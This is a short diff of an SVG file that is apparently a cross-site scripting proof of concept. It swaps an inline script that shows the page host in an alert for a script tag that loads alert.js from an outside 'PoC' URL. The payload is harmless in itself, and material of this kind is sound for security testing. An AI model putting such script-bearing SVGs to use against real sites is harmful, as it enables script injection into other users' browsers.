@@ -1,7 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
 <?xml-stylesheet href="xss.css" type="text/css"?>
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-    <script>
-        alert(window.location.host);
-    </script>
+    <script xlink:href="https://ry0tak.github.io/PoC/alert.js"/>
 </svg>
